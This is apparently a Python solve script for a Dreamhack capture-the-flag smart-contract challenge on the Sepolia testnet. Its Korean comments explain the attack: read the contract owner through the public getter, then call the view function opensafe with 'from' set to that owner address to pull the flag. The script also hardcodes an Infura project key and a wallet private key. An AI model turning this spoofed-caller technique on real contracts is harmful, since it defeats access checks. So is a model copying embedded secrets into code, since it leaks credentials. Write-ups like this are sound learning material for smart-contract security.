from web3 import Web3
import requests
import json

# 풀이
# 1. 솔리디티의 public 변수는 선언과 동시에 getter, setter 함수가 동시에 선언된다는 점을 이용하여
#    getter 함수 (call()) 을 이용하여 컨트랙트 Onwer의 주소 정보 확인
# 2. 1번에서 확인한 주소정보를 이용하여 opensafe 함수를 호출하는 시점에서 from: 에 해당 데이터를 넣고
#    스마트 컨트랙트를 호출해서 플래그 획득

# 문제에서 사용하는 각종 정보 추출
PROB_URL = "http://host3.dreamhack.games:16669"
RPC_URL = "https://sepolia.infura.io/v3/5a182f472a374f20ba4a6a017230aca5"

CONTRACT_ADDRESS = "0x5e992854Bd912ae170b7b5b8a64323e4e5E0feAF"
USER_PRIV_KEY = "0x0c9ca3de08698e455e30266085e8fcd6b41d604941abbd92f574cec53144a1bd"
USER_ADDRESS = "0xC25ae1Db77B06d234eD406F47e6A9B6A3C3C1d98"
OWNER_ADDRESS = ""

# 스마트 컨트랙트 ABI 설정
ABI = [
    {
            "inputs": [
                {
                        "internalType": "address",
                        "name": "_owner",
                        "type": "address"
                }
            ],
            "name": "changeOwner",
            "outputs": [],
            "stateMutability": "nonpayable",
            "type": "function"
    },
    {
            "inputs": [],
            "stateMutability": "nonpayable",
            "type": "constructor"
    },
    {
            "inputs": [],
            "name": "opensafe",
            "outputs": [
                {
                        "internalType": "string",
                        "name": "",
                        "type": "string"
                }
            ],
            "stateMutability": "view",
            "type": "function"
    },
    {
            "inputs": [],
            "name": "owner",
            "outputs": [
                {
                        "internalType": "address",
                        "name": "",
                        "type": "address"
                }
            ],
            "stateMutability": "view",
            "type": "function"
    }
]

# 스마트 컨트랙트 연결
web3 = Web3(Web3.HTTPProvider(RPC_URL))

contract = web3.eth.contract(address=CONTRACT_ADDRESS, abi=ABI)

# owner 변수의 getter를 호출하여 Owner의 사용자 주소 확인
OWNER_ADDRESS = contract.functions.owner().call()

# 확인한 데이터로 FLAG 호출
FLAG = contract.functions.opensafe().call({'from': OWNER_ADDRESS})

print(FLAG)